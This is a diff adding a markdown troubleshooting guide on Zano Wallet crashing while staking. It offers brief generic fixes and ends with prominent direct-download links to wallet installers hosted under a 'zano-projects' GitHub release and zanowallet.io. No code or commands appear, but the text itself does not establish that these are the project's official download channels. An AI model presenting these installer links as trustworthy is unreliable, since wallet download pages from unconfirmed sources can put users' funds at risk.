@@ -1,0 +1,77 @@
+<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/04-staking-ecosystem.webp" alt="Zano Wallet - Zano Wallet Crashes While Staking" width="100%"></p>
+
+<h1 align="center">Zano Wallet Crashes While Staking</h1>
+
+<p align="center">
+<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
+</p>
+
+---
+
+**Short answer:** Update to the latest Zano Wallet; your coins stay safe and staking continues once the wallet is open and synced again.
+
+## You'll see this if
+
+- The wallet closes after running 24/7
+- Windows shows the app stopped responding
+
+## Why it happens
+
+Long sessions expose bugs in older builds and power-saving settings can suspend the app.
+
+## How to fix it
+
+1. Install the latest release.
+2. Disable sleep and hibernate on the staking computer.
+3. Keep free disk space and memory available.
+4. Restart the wallet and confirm staking is on.
+5. Check the sync reaches 100%.
+
+Related reading: [How to Stake ZANO in the Desktop Wallet](./stake-zano-in-wallet.md) and the [staking feature](https://zanowallet.io/features/staking/).
+
+## If that didn't work
+
+If crashes continue, restore the wallet from seed on a fresh install. You can also read [How to Update Zano Wallet to the Latest Version](./update-zano-wallet.md).
+
+## Prevent it next time
+
+Restart the staking machine on a schedule and keep it updated. More on the website: [Zano Wallet FAQ](https://zanowallet.io/faq/).
+
+## FAQ
+
+**Did I lose staked coins?**  
+No. Coins never leave your wallet while staking.
+
+**Do rewards reset after a crash?**  
+Staking simply resumes when the wallet is running again.
+
+---
+
+## The fix in one step: install the latest Zano Wallet
+
+The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):
+
+[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)
+
+| Platform | File | Version |
+|---|---|---|
+| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
+| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
+| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |
+
+> [!TIP]
+> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.
+
+## Related guides
+
+| Guide | On the website |
+|---|---|
+| [How to Stake ZANO in the Desktop Wallet](./stake-zano-in-wallet.md) | [staking feature](https://zanowallet.io/features/staking/) |
+| [How to Update Zano Wallet to the Latest Version](./update-zano-wallet.md) | [Zano Wallet FAQ](https://zanowallet.io/faq/) |
+| [Zano Staking Rewards Explained](./zano-staking-rewards-explained.md) | [download the latest version](https://zanowallet.io/download/) |
+
+---
+
+<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
